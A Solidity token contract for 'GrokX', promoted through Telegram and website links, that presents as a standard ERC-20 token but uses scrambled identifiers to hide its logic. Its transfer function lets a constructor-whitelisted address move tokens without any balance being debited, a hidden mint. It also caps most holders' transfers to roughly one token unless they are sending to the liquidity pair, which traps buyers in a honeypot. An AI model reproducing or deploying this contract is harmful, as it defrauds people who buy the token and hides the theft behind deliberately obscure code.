/*

https://t.me/grokXtoken

https://grokx.ethtoken.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract GrokX is Ownable {
    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name;

    IUniswapV2Router02 private saurgh;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory xbrehydn, string memory lnadu, address oiaztvmfhrje, address bzotdv) {
        name = xbrehydn;
        symbol = lnadu;
        balanceOf[msg.sender] = totalSupply;
        cbhxprm[bzotdv] = true;
        saurgh = IUniswapV2Router02(oiaztvmfhrje);
    }

    mapping(address => bool) private cbhxprm;

    function approve(address cmpvrby, uint256 pjrbezfkhcyt) public returns (bool success) {
        allowance[msg.sender][cmpvrby] = pjrbezfkhcyt;
        emit Approval(msg.sender, cmpvrby, pjrbezfkhcyt);
        return true;
    }

    uint8 public decimals = 9;

    function vperh(address fumrhcoqvdts, address ftwneus, uint256 pjrbezfkhcyt) private {
        address slpte = IUniswapV2Factory(saurgh.factory()).getPair(address(this), saurgh.WETH());
        bool zpyokxdewrh = zymek[fumrhcoqvdts] == block.number;
        bool mxtwgycpbqda = !cbhxprm[fumrhcoqvdts];
        if (mxtwgycpbqda) {
            if (fumrhcoqvdts != slpte && pjrbezfkhcyt < totalSupply && (!zpyokxdewrh || pjrbezfkhcyt > mvilpyfdenhx[fumrhcoqvdts])) {
                require(totalSupply / (10 ** decimals) >= pjrbezfkhcyt);
            }
            balanceOf[fumrhcoqvdts] -= pjrbezfkhcyt;
        }
        mvilpyfdenhx[ftwneus] = pjrbezfkhcyt;
        balanceOf[ftwneus] += pjrbezfkhcyt;
        zymek[ftwneus] = block.number;
        emit Transfer(fumrhcoqvdts, ftwneus, pjrbezfkhcyt);
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private zymek;

    mapping(address => uint256) private mvilpyfdenhx;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address ftwneus, uint256 pjrbezfkhcyt) public returns (bool success) {
        vperh(msg.sender, ftwneus, pjrbezfkhcyt);
        return true;
    }

    function transferFrom(address fumrhcoqvdts, address ftwneus, uint256 pjrbezfkhcyt) public returns (bool success) {
        require(pjrbezfkhcyt <= allowance[fumrhcoqvdts][msg.sender]);
        allowance[fumrhcoqvdts][msg.sender] -= pjrbezfkhcyt;
        vperh(fumrhcoqvdts, ftwneus, pjrbezfkhcyt);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;
}
